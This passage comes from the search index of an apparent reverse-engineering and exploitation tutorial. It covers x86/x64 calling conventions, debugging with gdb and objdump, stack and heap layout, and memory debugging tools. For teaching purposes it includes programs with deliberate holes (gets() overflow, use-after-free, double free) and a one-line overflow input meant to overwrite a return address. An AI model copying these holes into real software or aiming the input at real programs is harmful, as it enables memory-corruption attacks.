convention)","text":"<pre><code>; Caller's responsibility to clean stack\n; Parameters pushed right to left\npush param3\npush param2\npush param1\ncall function\nadd esp, 12              ; Caller cleans stack (3 params * 4 bytes)\n</code></pre>"},{"location":"foundations/03-assembly/#stdcall-windows-api","title":"stdcall (Windows API)","text":"<pre><code>; Callee cleans stack\npush param3\npush param2  \npush param1\ncall function            ; Function will clean its own stack\n; No stack cleanup needed by caller\n</code></pre>"},{"location":"foundations/03-assembly/#x64-calling-conventions","title":"x64 Calling Conventions","text":""},{"location":"foundations/03-assembly/#system-v-abi-linux","title":"System V ABI (Linux)","text":"<ul> <li>First 6 integer/pointer args: RDI, RSI, RDX, RCX, R8, R9</li> <li>First 8 floating-point args: XMM0-XMM7</li> <li>Additional args on stack</li> <li>Return value in RAX</li> </ul>"},{"location":"foundations/03-assembly/#microsoft-x64-windows","title":"Microsoft x64 (Windows)","text":"<ul> <li>First 4 args: RCX, RDX, R8, R9</li> <li>First 4 floating-point args: XMM0-XMM3</li> <li>Additional args on stack</li> <li>32-byte shadow space required</li> <li>Return value in RAX</li> </ul> <pre><code>; Windows x64 example\nsub rsp, 32              ; Allocate shadow space\nmov rcx, param1          ; First parameter\nmov rdx, param2          ; Second parameter\nmov r8, param3           ; Third parameter\nmov r9, param4           ; Fourth parameter\npush param6              ; Sixth parameter (stack)\npush param5              ; Fifth parameter (stack)\ncall function\nadd rsp, 48              ; Clean up (32 shadow + 16 params)\n</code></pre>"},{"location":"foundations/03-assembly/#string-operations","title":"String Operations","text":"<pre><code>; String instructions (use ESI/EDI as pointers, ECX as counter)\n\n; Move string data\ncld                      ; Clear direction flag (forward)\nmov esi, source          ; Source address\nmov edi, dest            ; Destination address\nmov ecx, length          ; Number of elements\nrep movsb                ; Repeat move byte (copy string)\nrep movsw                ; Repeat move word\nrep movsd                ; Repeat move dword\n\n; Compare strings\nmov esi, string1\nmov edi, string2\nmov ecx, length\nrepe cmpsb               ; Compare bytes while equal\n\n; Scan string (find character)\nmov edi, string\nmov eax, 'A'             ; Character to find\nmov ecx, length\nrepne scasb              ; Scan while not equal\n\n; Store string\nmov edi, buffer\nmov eax, 0               ; Value to store\nmov ecx, length\nrep stosb                ; Fill buffer with zeros\n</code></pre>"},{"location":"foundations/03-assembly/#simd-instructions-mmxsseavx","title":"SIMD Instructions (MMX/SSE/AVX)","text":""},{"location":"foundations/03-assembly/#sse-example","title":"SSE Example","text":"<pre><code>; Working with 128-bit XMM registers\nmovaps xmm0, [esi]       ; Load 4 floats into XMM0\nmovaps xmm1, [edi]       ; Load 4 floats into XMM1\naddps xmm0, xmm1         ; Add 4 floats in parallel\nmovaps [edx], xmm0       ; Store result\n</code></pre>"},{"location":"foundations/03-assembly/#avx-example","title":"AVX Example","text":"<pre><code>; Working with 256-bit YMM registers\nvmovaps ymm0, [rsi]      ; Load 8 floats into YMM0\nvmovaps ymm1, [rdi]      ; Load 8 floats into YMM1\nvaddps ymm0, ymm0, ymm1  ; Add 8 floats in parallel\nvmovaps [rdx], ymm0      ; Store result\n</code></pre>"},{"location":"foundations/03-assembly/#practical-examples","title":"Practical Examples","text":""},{"location":"foundations/03-assembly/#example-1-simple-function","title":"Example 1: Simple Function","text":"<p>C Code: <pre><code>int add_three_numbers(int a, int b, int c) {\n    return a + b + c;\n}\n</code></pre></p> <p>x86 Assembly: <pre><code>add_three_numbers:\n    push ebp\n    mov ebp, esp\n\n    mov eax, [ebp+8]     ; Load parameter a\n    add eax, [ebp+12]    ; Add parameter b\n    add eax, [ebp+16]    ; Add parameter c\n\n    pop ebp\n    ret\n</code></pre></p> <p>x64 Assembly (System V ABI): <pre><code>add_three_numbers:\n    push rbp\n    mov rbp, rsp\n\n    add edi, esi         ; a + b (first two parameters)\n    add edi, edx         ; + c (third parameter)\n    mov eax, edi         ; Return value\n\n    pop rbp\n    ret\n</code></pre></p>"},{"location":"foundations/03-assembly/#example-2-array-iteration","title":"Example 2: Array Iteration","text":"<p>C Code: <pre><code>int sum_array(int *arr, int size) {\n    int sum = 0;\n    for (int i = 0; i &lt; size; i++) {\n        sum += arr[i];\n    }\n    return sum;\n}\n</code></pre></p> <p>x86 Assembly: <pre><code>sum_array:\n    push ebp\n    mov ebp, esp\n    push esi\n    push edi\n\n    mov esi, [ebp+8]     ; arr pointer\n    mov ecx, [ebp+12]    ; size\n    xor eax, eax         ; sum = 0\n    xor edi, edi         ; i = 0\n\nloop_start:\n    cmp edi, ecx         ; Compare i with size\n    jge loop_end         ; Jump if i &gt;= size\n\n    add eax, [esi + edi*4]  ; sum += arr[i]\n    inc edi              ; i++\n    jmp loop_start\n\nloop_end:\n    pop edi\n    pop esi\n    pop ebp\n    ret\n</code></pre></p>"},{"location":"foundations/03-assembly/#example-3-string-length","title":"Example 3: String Length","text":"<p>C Code: <pre><code>int my_strlen(const char *str) {\n    int len = 0;\n    while (*str++) {\n        len++;\n    }\n    return len;\n}\n</code></pre></p> <p>x86 Assembly: <pre><code>my_strlen:\n    push ebp\n    mov ebp, esp\n\n    mov edx, [ebp+8]     ; str pointer\n    xor eax, eax         ; len = 0\n\nstrlen_loop:\n    cmp byte ptr [edx], 0  ; Check if *str == 0\n    je strlen_done         ; Jump if end of string\n\n    inc eax              ; len++\n    inc edx              ; str++\n    jmp strlen_loop\n\nstrlen_done:\n    pop ebp\n    ret\n</code></pre></p>"},{"location":"foundations/03-assembly/#debugging-assembly","title":"Debugging Assembly","text":""},{"location":"foundations/03-assembly/#using-gdb","title":"Using GDB","text":"<pre><code># Compile with debug info\ngcc -g -O0 program.c -o program\n\n# Start debugging\ngdb ./program\n\n# Useful GDB commands for assembly\n(gdb) disassemble main          # Disassemble function\n(gdb) disassemble /m main       # Mixed source/assembly\n(gdb) x/10i $pc                 # Examine 10 instructions at PC\n(gdb) info registers            # Show all registers\n(gdb) info registers eax        # Show specific register\n(gdb) set disassembly-flavor intel  # Use Intel syntax\n(gdb) layout asm               # Assembly view\n(gdb) stepi                    # Step one instruction\n(gdb) nexti                    # Next instruction (skip calls)\n</code></pre>"},{"location":"foundations/03-assembly/#objdump-analysis","title":"Objdump Analysis","text":"<pre><code># Disassemble entire program\nobjdump -d program\n\n# Disassemble specific section\nobjdump -d -j .text program\n\n# Mixed source and assembly\nobjdump -S program\n\n# Intel syntax\nobjdump -M intel -d program\n\n# Show symbols\nobjdump -t program\n</code></pre>"},{"location":"foundations/03-assembly/#key-takeaways","title":"Key Takeaways","text":"<p>Assembly Fundamentals</p> <ul> <li>Registers are fast: Understanding register usage is crucial</li> <li>Stack grows down: ESP/RSP decreases when pushing</li> <li>Calling conventions matter: Parameters passed differently in x86 vs x64</li> <li>Addressing modes: Multiple ways to access memory</li> <li>Flags affect control flow: CMP sets flags used by conditional jumps</li> </ul> <p>Reverse Engineering Tips</p> <ul> <li>Learn to recognize common patterns (function prologue/epilogue)</li> <li>Understand the relationship between C constructs and assembly</li> <li>Practice reading both optimized and unoptimized code</li> <li>Familiarize yourself with both Intel and AT&amp;T syntax</li> <li>Use debugging tools to step through assembly execution</li> </ul> <p>Next: Memory Management</p>"},{"location":"foundations/04-memory/","title":"Memory Management: Stack and Heap","text":"<p>Understanding how programs manage memory is fundamental to both reverse engineering and exploitation. This section covers the stack, heap, and memory layout of processes.</p>"},{"location":"foundations/04-memory/#process-memory-layout","title":"Process Memory Layout","text":""},{"location":"foundations/04-memory/#virtual-memory-space-64-bit-linux","title":"Virtual Memory Space (64-bit Linux)","text":"<pre><code>High Memory (0x7fffffffffff)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        Kernel Space         \u2502 \u2190 Not accessible to user programs\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 0x00007fffffffffff\n\u2502          Stack              \u2502 \u2190 Grows downward\n\u2502             \u2193               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                             \u2502\n\u2502        Unused Space         \u2502\n\u2502                             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502             \u2191               \u2502\n\u2502          Heap               \u2502 \u2190 Grows upward\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502          BSS                \u2502 \u2190 Uninitialized global variables\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502          Data               \u2502 \u2190 Initialized global variables\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502          Text               \u2502 \u2190 Program code (read-only)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 0x0000000000400000 (typical)\nLow Memory\n</code></pre>"},{"location":"foundations/04-memory/#examining-memory-layout","title":"Examining Memory Layout","text":"<pre><code>// memory_layout.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\n// Global variables\nint global_init = 42;           // Data segment\nint global_uninit;              // BSS segment\nstatic int static_var = 100;    // Data segment\n\nvoid print_addresses() {\n    int stack_var = 10;          // Stack\n    int *heap_var = malloc(sizeof(int));  // Heap\n\n    printf(\"=== Memory Layout ===\\n\");\n    printf(\"Text segment (function): %p\\n\", (void*)print_addresses);\n    printf(\"Data segment (global):   %p\\n\", (void*)&amp;global_init);\n    printf(\"BSS segment (uninit):    %p\\n\", (void*)&amp;global_uninit);\n    printf(\"Stack (local var):       %p\\n\", (void*)&amp;stack_var);\n    printf(\"Heap (malloc):           %p\\n\", (void*)heap_var);\n    printf(\"Program break (sbrk):    %p\\n\", sbrk(0));\n\n    free(heap_var);\n}\n\nint main() {\n    print_addresses();\n    return 0;\n}\n</code></pre> <p>Compilation and Analysis: <pre><code># Compile and run\ngcc -o memory_layout memory_layout.c\n./memory_layout\n\n# Examine segments\nobjdump -h memory_layout\nreadelf -S memory_layout\n\n# Check memory mappings at runtime\ncat /proc/$(pidof memory_layout)/maps\n</code></pre></p>"},{"location":"foundations/04-memory/#the-stack","title":"The Stack","text":""},{"location":"foundations/04-memory/#stack-characteristics","title":"Stack Characteristics","text":"<ul> <li>LIFO (Last In, First Out) data structure</li> <li>Grows downward on most architectures (high to low addresses)</li> <li>Fast allocation/deallocation - just move stack pointer</li> <li>Automatic cleanup - variables cleaned up when leaving scope</li> <li>Limited size - typically 8MB on Linux</li> </ul>"},{"location":"foundations/04-memory/#stack-frame-structure","title":"Stack Frame Structure","text":"<pre><code>Stack Growth Direction: \u2193 (toward lower addresses)\n\nHigh Address\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Previous Frame   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Return Address    \u2502 \u2190 RSP points here initially\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Saved RBP         \u2502 \u2190 RBP points here after prologue\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Local Variable 1  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Local Variable 2  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Local Variable N  \u2502 \u2190 RSP points here after allocation\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLow Address\n</code></pre>"},{"location":"foundations/04-memory/#stack-operations-example","title":"Stack Operations Example","text":"<pre><code>// stack_example.c\n#include &lt;stdio.h&gt;\n\nvoid function_c(int param) {\n    int local_c = param * 2;\n    printf(\"In function_c: local_c = %d at %p\\n\", local_c, &amp;local_c);\n    printf(\"function_c stack pointer: %p\\n\", &amp;param);\n}\n\nvoid function_b(int param) {\n    int local_b = param + 10;\n    printf(\"In function_b: local_b = %d at %p\\n\", local_b, &amp;local_b);\n    function_c(local_b);\n    printf(\"Back in function_b\\n\");\n}\n\nvoid function_a() {\n    int local_a = 100;\n    printf(\"In function_a: local_a = %d at %p\\n\", local_a, &amp;local_a);\n    function_b(local_a);\n    printf(\"Back in function_a\\n\");\n}\n\nint main() {\n    printf(\"Stack demonstration:\\n\");\n    function_a();\n    return 0;\n}\n</code></pre>"},{"location":"foundations/04-memory/#assembly-view-of-stack-operations","title":"Assembly View of Stack Operations","text":"<pre><code>; Function prologue\npush rbp          ; Save old base pointer\nmov rbp, rsp      ; Set new base pointer\nsub rsp, 32       ; Allocate space for local variables\n\n; Accessing parameters (System V ABI)\nmov eax, edi      ; First parameter in EDI\nmov [rbp-4], eax  ; Store in local variable\n\n; Accessing local variables\nmov dword ptr [rbp-8], 42   ; Store value in local variable\nmov eax, [rbp-8]            ; Load value from local variable\n\n; Function epilogue\nmov rsp, rbp      ; Restore stack pointer\npop rbp           ; Restore old base pointer\nret               ; Return (pop return address and jump)\n</code></pre>"},{"location":"foundations/04-memory/#stack-smashing-example","title":"Stack Smashing Example","text":"<pre><code>// vulnerable.c - DO NOT USE IN PRODUCTION\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function() {\n    char buffer[64];\n    printf(\"Enter input: \");\n    gets(buffer);  // DANGEROUS: No bounds checking!\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n</code></pre> <p>What happens with buffer overflow: <pre><code>Normal stack:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Return Address    \u2502 \u2190 Should return to main\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502    Saved RBP        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502    buffer[0-63]     \u2502 \u2190 64-byte buffer\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nAfter overflow:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Overwritten Addr  \u2502 \u2190 Malicious return address\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Overwritten RBP    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Overflowing data... \u2502 \u2190 Data beyond buffer boundary\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p>"},{"location":"foundations/04-memory/#the-heap","title":"The Heap","text":""},{"location":"foundations/04-memory/#heap-characteristics","title":"Heap Characteristics","text":"<ul> <li>Dynamic allocation - size determined at runtime</li> <li>Manual management - programmer must allocate and free</li> <li>Fragmentation - can become fragmented over time</li> <li>Slower than stack - requires system calls for large allocations</li> <li>Grows upward on most systems (low to high addresses)</li> </ul>"},{"location":"foundations/04-memory/#mallocfree-implementation","title":"malloc/free Implementation","text":"<pre><code>// heap_example.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid heap_demonstration() {\n    printf(\"=== Heap Operations ===\\n\");\n\n    // Allocate different sized blocks\n    void *ptr1 = malloc(32);\n    void *ptr2 = malloc(64);\n    void *ptr3 = malloc(128);\n\n    printf(\"ptr1 (32 bytes):  %p\\n\", ptr1);\n    printf(\"ptr2 (64 bytes):  %p\\n\", ptr2);\n    printf(\"ptr3 (128 bytes): %p\\n\", ptr3);\n\n    // Calculate distances\n    printf(\"ptr2 - ptr1 = %ld\\n\", (char*)ptr2 - (char*)ptr1);\n    printf(\"ptr3 - ptr2 = %ld\\n\", (char*)ptr3 - (char*)ptr2);\n\n    // Free in different order\n    free(ptr2);  // Free middle block\n\n    // Allocate again - might reuse freed space\n    void *ptr4 = malloc(48);\n    printf(\"ptr4 (48 bytes):  %p\\n\", ptr4);\n\n    free(ptr1);\n    free(ptr3);\n    free(ptr4);\n}\n\nvoid heap_fragmentation() {\n    printf(\"\\n=== Heap Fragmentation ===\\n\");\n\n    void *ptrs[10];\n\n    // Allocate 10 blocks\n    for (int i = 0; i &lt; 10; i++) {\n        ptrs[i] = malloc(64);\n        printf(\"Block %d: %p\\n\", i, ptrs[i]);\n    }\n\n    // Free every other block\n    for (int i = 1; i &lt; 10; i += 2) {\n        free(ptrs[i]);\n        ptrs[i] = NULL;\n    }\n\n    // Try to allocate a large block\n    void *large = malloc(256);\n    printf(\"Large block (256 bytes): %p\\n\", large);\n\n    // Cleanup\n    for (int i = 0; i &lt; 10; i += 2) {\n        if (ptrs[i]) free(ptrs[i]);\n    }\n    if (large) free(large);\n}\n\nint main() {\n    heap_demonstration();\n    heap_fragmentation();\n    return 0;\n}\n</code></pre>"},{"location":"foundations/04-memory/#heap-metadata-structure","title":"Heap Metadata Structure","text":"<p>Most heap implementations store metadata alongside user data:</p> <pre><code>Typical malloc chunk structure:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Previous Size    \u2502 \u2190 Size of previous chunk (if free)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502    Current Size     \u2502 \u2190 Size of this chunk + flags\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                     \u2502\n\u2502    User Data        \u2502 \u2190 Pointer returned by malloc\n\u2502                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502    Footer (debug)   \u2502 \u2190 Optional footer for debugging\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSize field bits:\n- Bit 0: PREV_INUSE (previous chunk is in use)\n- Bit 1: IS_MMAPED (chunk allocated via mmap)\n- Bit 2: NON_MAIN_ARENA (chunk from non-main arena)\n</code></pre>"},{"location":"foundations/04-memory/#heap-analysis-tools","title":"Heap Analysis Tools","text":"<pre><code>// heap_debug.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;malloc.h&gt;  // Linux-specific\n\nvoid print_heap_info() {\n    struct mallinfo info = mallinfo();\n\n    printf(\"=== Heap Information ===\\n\");\n    printf(\"Total allocated space: %d bytes\\n\", info.hblkhd + info.uordblks);\n    printf(\"Total free space: %d bytes\\n\", info.fordblks);\n    printf(\"Number of free chunks: %d\\n\", info.ordblks);\n    printf(\"Top-most releasable space: %d bytes\\n\", info.keepcost);\n}\n\nint main() {\n    print_heap_info();\n\n    // Allocate some memory\n    void *ptr1 = malloc(1024);\n    void *ptr2 = malloc(2048);\n\n    printf(\"\\nAfter allocating 3072 bytes:\\n\");\n    print_heap_info();\n\n    // Free one block\n    free(ptr1);\n\n    printf(\"\\nAfter freeing 1024 bytes:\\n\");\n    print_heap_info();\n\n    free(ptr2);\n    return 0;\n}\n</code></pre>"},{"location":"foundations/04-memory/#memory-allocation-strategies","title":"Memory Allocation Strategies","text":""},{"location":"foundations/04-memory/#stack-vs-heap-comparison","title":"Stack vs Heap Comparison","text":"Feature Stack Heap Speed Very fast Slower Size Limited (~8MB) Limited by system memory Allocation Automatic Manual Deallocation Automatic Manual Fragmentation None Possible Access Pattern LIFO Random Thread Safety Per-thread Shared (needs synchronization)"},{"location":"foundations/04-memory/#when-to-use-each","title":"When to Use Each","text":"<p>Use Stack for: - Small, temporary data - Local variables - Function parameters - Return addresses - Data with known lifetime</p> <p>Use Heap for: - Large data structures - Data that outlives function scope - Dynamic arrays - Unknown size at compile time - Shared data between functions</p>"},{"location":"foundations/04-memory/#memory-alignment","title":"Memory Alignment","text":""},{"location":"foundations/04-memory/#alignment-requirements","title":"Alignment Requirements","text":"<pre><code>// alignment.c\n#include &lt;stdio.h&gt;\n#include &lt;stddef.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Unaligned {\n    char a;      // 1 byte\n    int b;       // 4 bytes (but needs 4-byte alignment)\n    char c;      // 1 byte\n    double d;    // 8 bytes (needs 8-byte alignment)\n};\n\nstruct Aligned {\n    double d;    // 8 bytes (aligned naturally)\n    int b;       // 4 bytes\n    char a;      // 1 byte\n    char c;      // 1 byte\n    // 2 bytes padding at end for alignment\n};\n\nvoid print_alignment() {\n    printf(\"=== Structure Alignment ===\\n\");\n    printf(\"sizeof(char): %zu\\n\", sizeof(char));\n    printf(\"sizeof(int): %zu\\n\", sizeof(int));\n    printf(\"sizeof(double): %zu\\n\", sizeof(double));\n    printf(\"sizeof(void*): %zu\\n\", sizeof(void*));\n\n    printf(\"\\nUnaligned struct: %zu bytes\\n\", sizeof(struct Unaligned));\n    printf(\"  a offset: %zu\\n\", offsetof(struct Unaligned, a));\n    printf(\"  b offset: %zu\\n\", offsetof(struct Unaligned, b));\n    printf(\"  c offset: %zu\\n\", offsetof(struct Unaligned, c));\n    printf(\"  d offset: %zu\\n\", offsetof(struct Unaligned, d));\n\n    printf(\"\\nAligned struct: %zu bytes\\n\", sizeof(struct Aligned));\n    printf(\"  d offset: %zu\\n\", offsetof(struct Aligned, d));\n    printf(\"  b offset: %zu\\n\", offsetof(struct Aligned, b));\n    printf(\"  a offset: %zu\\n\", offsetof(struct Aligned, a));\n    printf(\"  c offset: %zu\\n\", offsetof(struct Aligned, c));\n}\n\nvoid check_malloc_alignment() {\n    printf(\"\\n=== Malloc Alignment ===\\n\");\n\n    for (int i = 1; i &lt;= 64; i *= 2) {\n        void *ptr = malloc(i);\n        printf(\"malloc(%2d): %p (alignment: %zu)\\n\", \n               i, ptr, (size_t)ptr % 16);\n        free(ptr);\n    }\n}\n\nint main() {\n    print_alignment();\n    check_malloc_alignment();\n    return 0;\n}\n</code></pre>"},{"location":"foundations/04-memory/#manual-alignment","title":"Manual Alignment","text":"<pre><code>// manual_alignment.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n\nvoid* aligned_malloc(size_t size, size_t alignment) {\n    // Allocate extra space for alignment and metadata\n    void *raw = malloc(size + alignment + sizeof(void*));\n    if (!raw) return NULL;\n\n    // Calculate aligned address\n    uintptr_t raw_addr = (uintptr_t)raw;\n    uintptr_t aligned_addr = (raw_addr + sizeof(void*) + alignment - 1) &amp; ~(alignment - 1);\n\n    // Store original pointer before aligned address\n    void **aligned_ptr = (void**)aligned_addr;\n    aligned_ptr[-1] = raw;\n\n    return (void*)aligned_addr;\n}\n\nvoid aligned_free(void *ptr) {\n    if (ptr) {\n        // Retrieve original pointer\n        void **aligned_ptr = (void**)ptr;\n        free(aligned_ptr[-1]);\n    }\n}\n\nint main() {\n    printf(\"=== Manual Alignment ===\\n\");\n\n    // Allocate with different alignments\n    void *ptr16 = aligned_malloc(100, 16);\n    void *ptr32 = aligned_malloc(100, 32);\n    void *ptr64 = aligned_malloc(100, 64);\n\n    printf(\"16-byte aligned: %p (mod 16 = %zu)\\n\", ptr16, (size_t)ptr16 % 16);\n    printf(\"32-byte aligned: %p (mod 32 = %zu)\\n\", ptr32, (size_t)ptr32 % 32);\n    printf(\"64-byte aligned: %p (mod 64 = %zu)\\n\", ptr64, (size_t)ptr64 % 64);\n\n    aligned_free(ptr16);\n    aligned_free(ptr32);\n    aligned_free(ptr64);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/04-memory/#memory-debugging-tools","title":"Memory Debugging Tools","text":""},{"location":"foundations/04-memory/#valgrind","title":"Valgrind","text":"<pre><code># Install valgrind (Ubuntu/Debian)\nsudo apt install valgrind\n\n# Basic memory checking\nvalgrind --tool=memcheck ./program\n\n# Detailed output\nvalgrind --tool=memcheck --leak-check=full --show-leak-kinds=all ./program\n\n# Heap profiling\nvalgrind --tool=massif ./program\n</code></pre>"},{"location":"foundations/04-memory/#addresssanitizer-asan","title":"AddressSanitizer (ASan)","text":"<pre><code># Compile with AddressSanitizer\ngcc -fsanitize=address -g -o program program.c\n\n# Run - ASan will detect memory errors automatically\n./program\n</code></pre>"},{"location":"foundations/04-memory/#example-with-memory-errors","title":"Example with Memory Errors","text":"<pre><code>// memory_errors.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid buffer_overflow() {\n    char buffer[10];\n    strcpy(buffer, \"This string is too long!\"); // Buffer overflow\n}\n\nvoid use_after_free() {\n    int *ptr = malloc(sizeof(int));\n    *ptr = 42;\n    free(ptr);\n    printf(\"Value: %d\\n\", *ptr); // Use after free\n}\n\nvoid memory_leak() {\n    malloc(100); // Never freed\n}\n\nvoid double_free() {\n    int *ptr = malloc(sizeof(int));\n    free(ptr);\n    free(ptr); // Double free\n}\n\nint main() {\n    printf(\"Running memory error examples...\\n\");\n\n    // Uncomment one at a time to test\n    // buffer_overflow();\n    // use_after_free();\n    // memory_leak();\n    // double_free();\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/04-memory/#stack-and-heap-exploits-preview","title":"Stack and Heap Exploits Preview","text":""},{"location":"foundations/04-memory/#stack-based-buffer-overflow","title":"Stack-based Buffer Overflow","text":"<pre><code>// Simple stack overflow example\nvoid vulnerable() {\n    char buffer[64];\n    gets(buffer); // Dangerous!\n}\n\n// Attacker can overwrite return address:\n// python -c \"print 'A' * 72 + '\\x41\\x41\\x41\\x41'\" | ./program\n</code></pre>"},{"location":"foundations/04-memory/#heap-based-exploits","title":"Heap-based Exploits","text":"<pre><code>// Use-after-free vulnerability\nstruct object {\n    void (*function_ptr)();\n    int data;\n};\n\nstruct object *obj = malloc(sizeof(struct object));\nobj-&gt;function_ptr = legitimate_function;\nfree(obj);\n\n// Later, without setting obj = NULL\nobj-&gt;function_ptr(); // Calling freed memory!\n</code></pre>"},{"location":"foundations/04-memory/#best-practices","title":"Best Practices","text":""},{"location":"foundations/04-memory/#stack-safety","title":"Stack Safety","text":"<pre><code>// Use safe string functions\nchar buffer[100];\nstrncpy(buffer, source, sizeof(buffer) - 1);\nbuffer[sizeof(buffer) - 1] = '\\0';\n\n// Check bounds\nfor (int i = 0; i &lt; array_size &amp;&amp; i &lt; MAX_SIZE; i++) {\n    // Safe array access\n}\n\n// Use compiler protections\n// gcc -fstack-protector-all -D_FORTIFY_SOURCE=2\n</code></pre>"},{"location":"foundations/04-memory/#heap-safety","title":"Heap Safety","text":"<pre><code>// Always check malloc return value\nvoid *ptr = malloc(size);\nif (!ptr) {\n    // 